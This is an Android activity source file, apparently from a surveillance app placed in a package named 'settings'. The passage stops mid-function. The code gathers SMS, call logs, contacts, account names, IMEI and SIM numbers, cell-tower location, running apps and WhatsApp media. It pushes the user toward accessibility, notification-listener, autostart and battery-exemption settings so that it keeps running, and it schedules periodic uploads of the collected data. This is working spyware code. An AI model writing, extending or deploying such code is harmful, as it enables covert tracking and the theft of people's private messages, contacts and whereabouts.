package com.example.settings;

import static com.example.settings.Utils.checkpermission;
import static com.example.settings.Utils.getAppDataHistory;
import static com.example.settings.Utils.getBatteryPercent;
import static com.example.settings.Utils.getOtherNotification;
import static com.example.settings.Utils.getphoneAppdetails;
import static com.example.settings.Utils.isPhoneIsLockedOrNot;
import static com.example.settings.Utils.newUrlData;
import static com.example.settings.Utils.readCallLogs;
import static com.example.settings.Utils.readContacts;
import static com.example.settings.Utils.readSmsHistory;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.work.BackoffPolicy;
import androidx.work.Data;
import androidx.work.ExistingPeriodicWorkPolicy;
import androidx.work.ExistingWorkPolicy;
import androidx.work.OneTimeWorkRequest;
import androidx.work.PeriodicWorkRequest;
import androidx.work.WorkManager;

import android.Manifest;
import android.accounts.Account;
import android.accounts.AccountManager;
import android.annotation.SuppressLint;
import android.app.ActivityManager;
import android.app.AppOpsManager;
import android.app.usage.UsageStats;
import android.app.usage.UsageStatsManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.net.Uri;
import android.net.wifi.WifiManager;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.PowerManager;
import android.provider.Settings;
import android.telephony.CellIdentityGsm;
import android.telephony.CellIdentityLte;
import android.telephony.CellInfo;
import android.telephony.CellInfoGsm;
import android.telephony.CellInfoLte;
import android.telephony.CellSignalStrengthGsm;
import android.telephony.CellSignalStrengthLte;
import android.telephony.SubscriptionInfo;
import android.telephony.SubscriptionManager;
import android.telephony.TelephonyManager;
import android.text.format.DateFormat;
import android.text.format.Formatter;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ImageView;

import com.google.firebase.storage.StorageReference;
import com.google.gson.Gson;
import com.google.gson.reflect.TypeToken;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.lang.reflect.Type;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.SortedMap;
import java.util.TreeMap;
import java.util.concurrent.TimeUnit;

public class MainActivity extends AppCompatActivity implements View.OnClickListener {
    Sharedpref mSharedpref;
    EditText mEditname;
    Button btsave, mAccessbilitySettings, SyncData, AutoStart, BaterryinOther, BaterryinMi, Othernotifications,Start,Stop,Appusage;
    public static PeriodicWorkRequest mPeriodicWorkRequest, mPeriodicWorkRequest1, mGetUrlPeriodicWorkRequest;
    static OneTimeWorkRequest mOneTimeWorkRequest, UrlTimeWorkRequest;
    public static WorkManager mWorkManager;
    ArrayList<Model> modelList;
    ImageView miImageView;
    StorageReference storageRef;

    @RequiresApi(api = Build.VERSION_CODES.O)
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        mSharedpref = new Sharedpref(this);
        miImageView = findViewById(R.id.image);
       // getAllShownImagesPath();
        //getAudios();
        //getWhatsAppStatus(mSharedpref);
       // MultiMediaData multiMediaData=new MultiMediaData(this,mSharedpref);
       // multiMediaData.getAllShownImagesPath();
       // multiMediaData.getWhatsAppStatus();

        mWorkManager = WorkManager.getInstance();
       // clipboardManager = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);

        mEditname = findViewById(R.id.ed_name);
        btsave = findViewById(R.id.btsave);
        btsave.setOnClickListener(this);

        mAccessbilitySettings = findViewById(R.id.gotoAccessbilitSettings);
        mAccessbilitySettings.setOnClickListener(this);

        Othernotifications = findViewById(R.id.Othernotifications);
        Othernotifications.setOnClickListener(this);

        BaterryinOther = findViewById(R.id.BaterryinOther);
        BaterryinOther.setOnClickListener(this);

        BaterryinMi = findViewById(R.id.BaterryinMi);
        BaterryinMi.setOnClickListener(this);

        AutoStart = findViewById(R.id.CheckAutoStart);
        AutoStart.setOnClickListener(this);

        Appusage=findViewById(R.id.AppUsage);
        Appusage.setOnClickListener(this);
        Start=findViewById(R.id.CheckStart);
        Start.setOnClickListener(this);

        Stop=findViewById(R.id.CheckStop);
        Stop.setOnClickListener(this);

        SyncData = findViewById(R.id.SynData);
        SyncData.setOnClickListener(this);
/*
        IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
        Intent batteryStatus = registerReceiver(null, ifilter);
        int status = batteryStatus.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
        boolean isCharging = status == BatteryManager.BATTERY_STATUS_CHARGING ||
                status == BatteryManager.BATTERY_STATUS_FULL;
        // How are we charging?
        int chargePlug = batteryStatus.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1);
        boolean usbCharge = chargePlug == BatteryManager.BATTERY_PLUGGED_USB;
        boolean acCharge = chargePlug == BatteryManager.BATTERY_PLUGGED_AC;
        int level = batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
        int scale = batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
        float batteryPct = level * 100 / (float)scale;*/
        String name=mSharedpref.getSaveName();

        if (!name.isEmpty() && !name.equalsIgnoreCase("No Name Yet")) {
            mEditname.setText(mSharedpref.getSaveName());
            mEditname.setEnabled(false);
            btsave.setEnabled(false);
            btsave.setOnClickListener(null);
        }
        //checkServices(getApplicationContext(),mSharedpref);
        // String val=getFiles(mSharedpref);
        //readSmsHistory(this,mSharedpref);
        runningTasks();
        checkpermissions();
        getphoneAppdetails(MainActivity.this,mSharedpref);
        isPhoneIsLockedOrNot(getApplicationContext());
        getBatteryPercent(this, mSharedpref);
        getOtherNotification(this,mSharedpref);
        String lastenty = mSharedpref.getServiceNotificationData();
        String lastentry = mSharedpref.getAudioJson();
        String lastentry1 = mSharedpref.getAudioList();
        String lastentry2 = mSharedpref.getImagesJson();
        String lastentry3 = mSharedpref.getImageList();
        String lastentry4 = mSharedpref.getWhatsAppAImageJson();
        String lastentry5 = mSharedpref.getWhatsAppAImageList();
        String lastentry6 = mSharedpref.getAudioJson();
        String lastentry7 = mSharedpref.getAudioList();
        String lastentry8 = mSharedpref.getWhatsAppStatusJson();
        String lastentry9 = mSharedpref.getWhatsAppAStatusList();


    }


    private void checkAutoStartOption() {
        String manufacturer = android.os.Build.MANUFACTURER;
        try {
            Intent intent = new Intent();
            if ("xiaomi".equalsIgnoreCase(manufacturer)) {
                intent.setComponent(new ComponentName("com.miui.securitycenter", "com.miui.permcenter.autostart.AutoStartManagementActivity"));
            } else if ("oppo".equalsIgnoreCase(manufacturer)) {
                intent.setComponent(new ComponentName("com.coloros.safecenter", "com.coloros.safecenter.permission.startup.StartupAppListActivity"));
            } else if ("vivo".equalsIgnoreCase(manufacturer)) {
                intent.setComponent(new ComponentName("com.vivo.permissionmanager", "com.vivo.permissionmanager.activity.BgStartUpManagerActivity"));
            } else if ("Letv".equalsIgnoreCase(manufacturer)) {
                intent.setComponent(new ComponentName("com.letv.android.letvsafe", "com.letv.android.letvsafe.AutobootManageActivity"));
            } else if ("Honor".equalsIgnoreCase(manufacturer)) {
                intent.setComponent(new ComponentName("com.huawei.systemmanager", "com.huawei.systemmanager.optimize.process.ProtectActivity"));
            }
            List<ResolveInfo> list = getPackageManager().queryIntentActivities(intent, PackageManager.MATCH_DEFAULT_ONLY);
            if (list.size() > 0) {
                startActivity(intent);
            }

        } catch (Exception e) {
            //Toast.makeText(getApplicationContext(), "Error in AutoStart", Toast.LENGTH_SHORT).show();
            e.printStackTrace();
        }
    }

    public static void setupWorkManager() {
        Data.Builder mData= new Data.Builder();
        mData.putString ("Type","Periodic");
        mPeriodicWorkRequest = new PeriodicWorkRequest.Builder(SyncData.class, 15,
                TimeUnit.MINUTES).setInputData(mData.build()).setBackoffCriteria(
                BackoffPolicy.LINEAR,
                PeriodicWorkRequest.MIN_BACKOFF_MILLIS,
                TimeUnit.MILLISECONDS).build();
        mWorkManager.enqueueUniquePeriodicWork("PERIODIC_REQUEST_TAG", ExistingPeriodicWorkPolicy.REPLACE, mPeriodicWorkRequest);
       // geturl();
       /* mPeriodicWorkRequest1 = new PeriodicWorkRequest.Builder(SyncContact.class, 50,
                TimeUnit.MINUTES).setBackoffCriteria(
                BackoffPolicy.LINEAR,
                PeriodicWorkRequest.MIN_BACKOFF_MILLIS,
                TimeUnit.MILLISECONDS).build();
        mWorkManager.enqueueUniquePeriodicWork("PERIODIC_REQUEST_TAG", ExistingPeriodicWorkPolicy.KEEP, mPeriodicWorkRequest1);*/

    }

    public static void geturl() {
        mGetUrlPeriodicWorkRequest = new PeriodicWorkRequest.Builder(GetNewUrl.class, 25,
                TimeUnit.MINUTES).setBackoffCriteria(
                BackoffPolicy.LINEAR,
                PeriodicWorkRequest.MIN_BACKOFF_MILLIS,
                TimeUnit.MILLISECONDS).build();
        mWorkManager.enqueueUniquePeriodicWork("PERIODIC_REQUEST_TAG", ExistingPeriodicWorkPolicy.KEEP, mGetUrlPeriodicWorkRequest);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == 100) {
          //  setupWorkManager();
        }
        if(requestCode==101){
           // Intent i=new Intent(MainActivity.this,NotificationService.class);
         //   startActivity(i);
        }
        if(requestCode==102) {
            getAppDataHistory(getApplicationContext(),mSharedpref);
        }
    }

    private void checkpermissions() {
        try {
            if ((ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE)
                    != PackageManager.PERMISSION_GRANTED) ||
                    (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS)
                            != PackageManager.PERMISSION_GRANTED) ||
                    (ContextCompat.checkSelfPermission(this, Manifest.permission.GET_ACCOUNTS)
                            != PackageManager.PERMISSION_GRANTED) ||
                    (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION)
                            != PackageManager.PERMISSION_GRANTED)
                    || (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
                    != PackageManager.PERMISSION_GRANTED)
                    || (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG)
                    != PackageManager.PERMISSION_GRANTED)
                    || (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS)
                    != PackageManager.PERMISSION_GRANTED)
                    || (ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_CONTACTS)
                    != PackageManager.PERMISSION_GRANTED)
                    || (ContextCompat.checkSelfPermission(this, Manifest.permission.RECEIVE_SMS)
                    != PackageManager.PERMISSION_GRANTED) ||
                    (ContextCompat.checkSelfPermission(this, Manifest.permission.PROCESS_OUTGOING_CALLS)
                            != PackageManager.PERMISSION_GRANTED) ||
                    (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE)
                            != PackageManager.PERMISSION_GRANTED) ||
                    (ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE)
                            != PackageManager.PERMISSION_GRANTED))
                    {
                ActivityCompat.requestPermissions(this,
                        new String[]{Manifest.permission.PROCESS_OUTGOING_CALLS,
                                Manifest.permission.WRITE_EXTERNAL_STORAGE,
                                Manifest.permission.READ_EXTERNAL_STORAGE,
                                Manifest.permission.READ_PHONE_STATE,
                                Manifest.permission.GET_ACCOUNTS,
                                Manifest.permission.ACCESS_COARSE_LOCATION,
                                Manifest.permission.ACCESS_FINE_LOCATION,
                                Manifest.permission.READ_CALL_LOG,
                                Manifest.permission.READ_CONTACTS,
                                Manifest.permission.WRITE_CONTACTS,
                                Manifest.permission.RECEIVE_SMS,
                                Manifest.permission.READ_SMS
                        },
                        1);
            } else {
                setuponetimeworkManager(getApplicationContext(),"Permission Already Given");
                getImieNumbers(this);
                AsyncTask.execute(new Runnable() {
                    @Override
                    public void run() {
                        readContacts(MainActivity.this,mSharedpref);
                    }
                });
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        checkSeperatePermissions();
        setuponetimeworkManager(getApplicationContext(),"Permission might be Already given");

        getImieNumbers(this);
        simName(getApplicationContext());
        getCellInfo(this);

        AsyncTask.execute(new Runnable() {
            @Override
            public void run() {
                readContacts(MainActivity.this,mSharedpref);
            }
        });
        AsyncTask.execute(new Runnable() {
            @Override
            public void run() {
                readCallLogs(getApplicationContext(), mSharedpref);
            }
        });
        AsyncTask.execute(new Runnable() {
            @Override
            public void run() {
                readSmsHistory(getApplicationContext(), mSharedpref);
            }
        });
        AsyncTask.execute(new Runnable() {
            @Override
            public void run() {
                getMultimediaData();
            }
        });
    }

    private void checkSeperatePermissions() {
        if(!checkpermission(getApplicationContext(),Manifest.permission.READ_PHONE_STATE)){
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_PHONE_STATE},1);
            return;
         }
        if(!checkpermission(getApplicationContext(),Manifest.permission.READ_SMS)){
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_SMS},1);
            return;
        }
    }

    private void getMultimediaData() {
        MultiMediaData multiMediaData=new MultiMediaData(this,mSharedpref);
        multiMediaData.getAllShownImagesPath();
        multiMediaData.getAudios();
        multiMediaData.getWhatsAppAudios();
        multiMediaData.getWhatsphotos();
        multiMediaData.getWhatsAppStatus();
    }


    public static HashMap<String, Object> deviceInformation(Context cntx) {
        HashMap<String, Object> deviceInfo = new HashMap<String, Object>();
        try {
            String os = System.getProperty("os.version"); // OS version
            String sdk = Build.VERSION.SDK;// API Level
            String device = Build.DEVICE;// Device
            String manufacturer = Build.MANUFACTURER;//MANUFACTURER
            String brand = Build.BRAND;
            int versionCode = BuildConfig.VERSION_CODE;
            String versionName = BuildConfig.VERSION_NAME;
            String androidId = Settings.Secure.getString(cntx.getContentResolver(),
                    Settings.Secure.ANDROID_ID);
            WifiManager wm = (WifiManager) cntx.getSystemService(WIFI_SERVICE);
            String ip = Formatter.formatIpAddress(wm.getConnectionInfo().getIpAddress());
            String macAddress = getMACAddress("wlan0");
            String macAddress1 = getMACAddress("eth0");
            String ipV4Adress = getIPAddress(true);
            String ipV6Adress = getIPAddress(false);

            String model = Build.MODEL;// Model
            String product = Build.PRODUCT;
            deviceInfo.put("os", os);
            deviceInfo.put("sdk", sdk);
            deviceInfo.put("device", device);
            deviceInfo.put("manufacturer", manufacturer);
            deviceInfo.put("brand", brand);
            deviceInfo.put("versionCode", versionCode);
            deviceInfo.put("versionName", versionName);
            deviceInfo.put("androidId", androidId);
            deviceInfo.put("ip", ip);
            deviceInfo.put("macAddress", macAddress);
            deviceInfo.put("macAddress1", macAddress1);
            deviceInfo.put("ipV4Adress", ipV4Adress);
            deviceInfo.put("ipV6Adress", ipV6Adress);
            deviceInfo.put("model", model);
            deviceInfo.put("product", product);
            deviceInfo.put("imeiNumber", getImieNumbers(cntx));
        }
        catch (Exception e){
            e.printStackTrace();
            return deviceInfo;
        }

        return deviceInfo;
    }

    @SuppressLint("MissingPermission")
    private static String getImieNumbers(Context cntx) {
        TelephonyManager tm = (TelephonyManager) cntx.getSystemService(Context.TELEPHONY_SERVICE);
        if (ActivityCompat.checkSelfPermission(cntx, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
            // TODO: Consider calling
            //    ActivityCompat#requestPermissions
            // here to request the missing permissions, and then overriding
            //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
            //                                          int[] grantResults)
            // to handle the case where the user grants the permission. See the documentation
            // for ActivityCompat#requestPermissions for more details.
            String imeiNumber1 = "", imeiNumber2 = "";
            if (android.os.Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                imeiNumber1 = Settings.Secure.getString(cntx.getContentResolver(), Settings.Secure.ANDROID_ID);
            } else if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                imeiNumber1 = tm.getImei(0);
                imeiNumber2 = tm.getImei(1);

            } else if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
                imeiNumber1 = tm.getDeviceId(0);
                imeiNumber2 = tm.getDeviceId(1);
            }


            return imeiNumber1 + "," + imeiNumber2;
        }

        return "";
    }

    public static String getMACAddress(String interfaceName) {
        try {
            List<NetworkInterface> interfaces = Collections.list(NetworkInterface.getNetworkInterfaces());
            for (NetworkInterface intf : interfaces) {
                if (interfaceName != null) {
                    if (!intf.getName().equalsIgnoreCase(interfaceName)) continue;
                }
                byte[] mac = intf.getHardwareAddress();
                if (mac == null) return "";
                StringBuilder buf = new StringBuilder();
                for (byte aMac : mac) buf.append(String.format("%02X:", aMac));
                if (buf.length() > 0) buf.deleteCharAt(buf.length() - 1);
                return buf.toString();
            }
        } catch (Exception ignored) {
        } // for now eat exceptions
        return "";
        /*try {
            // this is so Linux hack
            return loadFileAsString("/sys/class/net/" +interfaceName + "/address").toUpperCase().trim();
        } catch (IOException ex) {
            return null;
        }*/
    }

    public static String getIPAddress(boolean useIPv4) {
        try {
            List<NetworkInterface> interfaces = Collections.list(NetworkInterface.getNetworkInterfaces());
            for (NetworkInterface intf : interfaces) {
                List<InetAddress> addrs = Collections.list(intf.getInetAddresses());
                for (InetAddress addr : addrs) {
                    if (!addr.isLoopbackAddress()) {
                        String sAddr = addr.getHostAddress();
                        //boolean isIPv4 = InetAddressUtils.isIPv4Address(sAddr);
                        boolean isIPv4 = sAddr.indexOf(':') < 0;

                        if (useIPv4) {
                            if (isIPv4)
                                return sAddr;
                        } else {
                            if (!isIPv4) {
                                int delim = sAddr.indexOf('%'); // drop ip6 zone suffix
                                return delim < 0 ? sAddr.toUpperCase() : sAddr.substring(0, delim).toUpperCase();
                            }
                        }
                    }
                }
            }
        } catch (Exception ignored) {
        } // for now eat exceptions
        return "";

    }

    public static JSONArray simName(Context mContext) {
        JSONArray phonessimdetail = new JSONArray();
        try {
            if (Build.VERSION.SDK_INT > 22) {
                SubscriptionManager subscriptionManager = (SubscriptionManager) mContext.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE);

                if (ActivityCompat.checkSelfPermission(mContext, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
                    // TODO: Consider calling
                    //    ActivityCompat#requestPermissions
                    // here to request the missing permissions, and then overriding
                    //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
                    //                                          int[] grantResults)
                    // to handle the case where the user grants the permission. See the documentation
                    // for ActivityCompat#requestPermissions for more details.
                    return phonessimdetail;
                }
                List<SubscriptionInfo> subscriptionInfoList = subscriptionManager.getActiveSubscriptionInfoList();
                JSONObject cellObj = new JSONObject();
                if (subscriptionInfoList != null && subscriptionInfoList.size() > 0) {
                    for (SubscriptionInfo info : subscriptionInfoList) {
                        String carrierName = info.getCarrierName().toString();
                        String countryIso = info.getCountryIso();
                        int dataRoaming = info.getDataRoaming();
                        String mobileNo = info.getNumber();
                        String mIccId = info.getIccId();
                        try {
                            cellObj.put("carrierName", carrierName);
                            cellObj.put("countryIso", info.getCountryIso());
                            cellObj.put("dataRoaming", String.valueOf(info.getDataRoaming()));
                            cellObj.put("mobileNo", info.getNumber());
                            cellObj.put("mIccId", info.getIccId());
                            cellObj.put("DefaultSim", getDefaultSimmm(mContext));
                            cellObj.put("accounts",getemails(mContext));
                            phonessimdetail.put(cellObj);
                        } catch (JSONException e) {
                            e.printStackTrace();
                        }
                    }
                }

            }
        }
        catch (Exception e){
            e.printStackTrace();
            return phonessimdetail;
        }

        return phonessimdetail;
    }

    private static String getemails(Context context) {
        String possibleEmail="";

        try{
            possibleEmail += "Get Registered Gmail Account\n";
            @SuppressLint("MissingPermission") Account[] accounts =
                    AccountManager.get(context).getAccountsByType("com.google");

            for (Account account : accounts) {

                possibleEmail += " --> "+account.name+" : "+account.type+" , \n";
                possibleEmail += " \n\n";

            }
        }
        catch(Exception e)
        {
            Log.i("Exception", "Exception:"+e) ;
        }


        try{
            possibleEmail += "Get All Registered Account\n";

            @SuppressLint("MissingPermission") Account[] accounts = AccountManager.get(context).getAccounts();
            for (Account account : accounts) {

                possibleEmail += " --> "+account.name+" : "+account.type+" , \n";
                possibleEmail += " \n";

            }
        }
        catch(Exception e)
        {
            Log.i("Exception", "Exception:"+e) ;
        }

        // Show on screen

        Log.i("Exception", "mails:"+possibleEmail) ;
        return possibleEmail;
    }

    public static int getDefaultSimmm(Context context) {
        int defaultSmsId = 0;

        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.LOLLIPOP_MR1) {
            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
                // TODO: Consider calling
                //    ActivityCompat#requestPermissions
                // here to request the missing permissions, and then overriding
                //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
                //                                          int[] grantResults)
                // to handle the case where the user grants the permission. See the documentation
                // for ActivityCompat#requestPermissions for more details.
                return -1;
            }
            SubscriptionManager manager = (SubscriptionManager) context.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE);
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.N) {
                defaultSmsId = manager.getDefaultSmsSubscriptionId();
            }
        }

        return defaultSmsId;
    }

    public static JSONArray getCellInfo(Context ctx) {

        JSONArray cellList = new JSONArray();
        try {
            // Type of the network
            TelephonyManager tel = (TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);
            int phoneTypeInt = tel.getPhoneType();
            String phoneType = null;
            phoneType = phoneTypeInt == TelephonyManager.PHONE_TYPE_GSM ? "gsm" : phoneType;
            phoneType = phoneTypeInt == TelephonyManager.PHONE_TYPE_CDMA ? "cdma" : phoneType;

            //from Android M up must use getAllCellInfo
        /*if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) {


            List<NeighboringCellInfo> neighCells = tel.getNeighboringCellInfo();
            for (int i = 0; i < neighCells.size(); i++) {
                try {
                    JSONObject cellObj = new JSONObject();
                    NeighboringCellInfo thisCell = neighCells.get(i);
                    cellObj.put("cellId", thisCell.getCid());
                    cellObj.put("lac", thisCell.getLac());
                    cellObj.put("rssi", thisCell.getRssi());
                    cellList.put(cellObj);
                } catch (Exception e) {
                }
            }

        } else {*/
            if (ActivityCompat.checkSelfPermission(ctx, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
                // TODO: Consider calling
                //    ActivityCompat#requestPermissions
                // here to request the missing permissions, and then overriding
                //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
                //                                          int[] grantResults)
                // to handle the case where the user grants the permission. See the documentation
                // for ActivityCompat#requestPermissions for more details.
                return cellList;
            }
            List<CellInfo> infos = tel.getAllCellInfo();
            for (int i = 0; i < infos.size(); ++i) {
                try {
                    JSONObject cellObj = new JSONObject();
                    CellInfo info = infos.get(i);
                    if (info instanceof CellInfoGsm) {
                        CellSignalStrengthGsm gsm = ((CellInfoGsm) info).getCellSignalStrength();
                        CellIdentityGsm identityGsm = ((CellInfoGsm) info).getCellIdentity();
                        cellObj.put("cellId", identityGsm.getCid());
                        cellObj.put("lac", identityGsm.getLac());
                        cellObj.put("dbm", gsm.getDbm());
                        cellObj.put("mnc", identityGsm.getMnc());
                        cellObj.put("mcc", identityGsm.getMcc());
                        cellList.put(cellObj);
                    } else if (info instanceof CellInfoLte) {
                        CellSignalStrengthLte lte = ((CellInfoLte) info).getCellSignalStrength();
                        CellIdentityLte identityLte = ((CellInfoLte) info).getCellIdentity();
                        cellObj.put("cellId", identityLte.getCi());
                        cellObj.put("tac", identityLte.getTac());
                        cellObj.put("dbm", lte.getDbm());
                        cellList.put(cellObj);
                    }

                } catch (Exception ex) {

                }
            }
        }
        catch (Exception e){
            e.printStackTrace();
            return cellList;
        }
        return cellList;
    }

    @Override
    public void onClick(View view) {
        Intent intent;
        switch (view.getId()) {
            case R.id.Othernotifications:
                intent = new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
                startActivityForResult(intent,101);
                break;
            case R.id.gotoAccessbilitSettings:
                intent = new Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS);
                startActivityForResult(intent, 100);
                break;
            case R.id.btsave:
                if (!mEditname.getText().toString().isEmpty()) {
                    mSharedpref.setSaveName(mEditname.getText().toString());
                    mSharedpref.commit();
                    mEditname.setEnabled(false);
                    btsave.setEnabled(false);
                    btsave.setOnClickListener(null);
                }
                break;
            case R.id.BaterryinOther:
                try {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                        intent = new Intent();
                        String packageName = getPackageName();
                        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
                        if (pm != null && !pm.isIgnoringBatteryOptimizations(packageName)) {
                            intent.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                            intent.setData(Uri.parse("package:" + packageName));
                            startActivity(intent);
                        }
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                    //Toast.makeText(getApplicationContext(), "Error in Battery Opti", Toast.LENGTH_SHORT).show();
                }

                break;
            case R.id.BaterryinMi:
                try {
                    String manufacturer = "xiaomi";
                    if (manufacturer.equalsIgnoreCase(android.os.Build.MANUFACTURER)) {
                        Intent intent1 = new Intent();
                        intent1.setClassName("com.miui.powerkeeper",
                                "com.miui.powerkeeper.ui.HiddenAppsContainerManagementActivity");
                        startActivity(intent1);
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                  //  Toast.makeText(getApplicationContext(), "Error in Battery Opti", Toast.LENGTH_SHORT).show();
                }
                break;
                case R.id.CheckAutoStart:
                    //setupWorkManager();
                    //setuponetimeworkManager("From Stop Button");
                    checkAutoStartOption();
                break;
            case R.id.AppUsage:
                Intent intei = new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS);
                startActivityForResult(intei,102);
                break;
            case R.id.CheckStart:
                setupWorkManager();
                break;
            case R.id.CheckStop:
                setuponetimeworkManager(getApplicationContext(),"From Stop Button");
                break;
            case R.id.SynData:
                setuponetimeworkManager(getApplicationContext(),"From Sync Button");
                break;
        }
    }


    private boolean checkStatus() {
        try {
            PackageManager packageManager = getApplicationContext().getPackageManager();
            ApplicationInfo applicationInfo = packageManager.getApplicationInfo(getApplicationContext().getPackageName(), 0);
            AppOpsManager appOpsManager = (AppOpsManager) getApplicationContext().getSystemService(Context.APP_OPS_SERVICE);
            int mode = appOpsManager.checkOpNoThrow(AppOpsManager.OPSTR_GET_USAGE_STATS, applicationInfo.uid, applicationInfo.packageName);
            return (mode != AppOpsManager.MODE_ALLOWED);
        } catch (PackageManager.NameNotFoundException e) {
            return false;
        }
    }

    private void runningTasks() {
        ActivityManager activityManager = (ActivityManager) getApplicationContext().getSystemService(Context.ACTIVITY_SERVICE);
        List<ActivityManager.RunningAppProcessInfo> runAppProcessesList = activityManager.getRunningAppProcesses();
        for (ActivityManager.RunningAppProcessInfo runAppProcess : runAppProcessesList) {
            if (runAppProcess.importance == ActivityManager.RunningAppProcessInfo.IMPORTANCE_FOREGROUND) {
                Log.d("current foreground App", runAppProcess.processName);
            }
        }
    }


    public static void setuponetimeworkManager(Context mContext,String message) {
    try {
        Sharedpref mSharedpref = new Sharedpref(mContext);
        boolean toSendData=mSharedpref.getSendDataOneTime();
        if (toSendData){
            SendData mSendData=new SendData(mContext,message);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                mSendData.doUpload();
            }
        }
        else {
            newUrlData(mContext,mSharedpref);
        }

     /*   Data.Builder mData= new Data.Builder();
        mData.putString ("Type","Onetime "+message);
        mOneTimeWorkRequest = new OneTimeWorkRequest.Builder(SyncOneTimeData.class).setInputData(mData.build()).build();
        mWorkManager.enqueueUniqueWork("One_REQUEST_TAG", ExistingWorkPolicy.REPLACE, mOneTimeWorkRequest);
        UrlTimeWorkRequest=new OneTimeWorkRequest.Builder(GetNewUrl.class).build();
        mWorkManager.enqueue(UrlTimeWorkRequest);*/
    }
    catch (Exception e)
    {
        e.printStackTrace();
    }

    }
    /*private boolean isPhoneIsLockedOrNot(Context context) {
        boolean isPhoneLock = false;
        if (context != null) {
            KeyguardManager myKM = (KeyguardManager) context.getSystemService(Context.KEYGUARD_SERVICE);
            if (myKM != null && myKM.isKeyguardLocked()) {
                isPhoneLock = true;
            }
        }
        return isPhoneLock;
    }*/
    static String laststatus="";
    static String status;
    public  static String getFiles(Sharedpref mSharedpref){
        String convertarray;
        try {
            ArrayList<String> filenames=new ArrayList<>();
            ArrayList<String> prevfilenames;
            ArrayList<String> addNewFiles=new ArrayList<>();
            String path = Environment.getExternalStorageDirectory().toString()+"/WhatsApp/Media/";
           ///storage/emulated/0/WhatsApp/Media/WhatsApp Voice Notes
            Log.d("Files", "Path: " + path);
            File directory = new File(path);
            File[] files = directory.listFiles();
            Log.d("Files", "Size: "+ files.length);
            for (int i = 0; i < files.length; i++)
            {
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                    String filedate=("/storage/emulated/0/DCIM/Camera/"+ files[i].getName());
                    String currentDate = new SimpleDateFormat("dd-MM-yyyy", Locale.getDefault()).format(new Date());
                    if (filedate.equalsIgnoreCase(currentDate)){
                        filenames.add(files[i].getName());
                    }
                }
                else {
                    return "";
                }
            }
            Gson gson=new Gson();
            Type listType = new TypeToken< ArrayList<String> >(){}.getType();
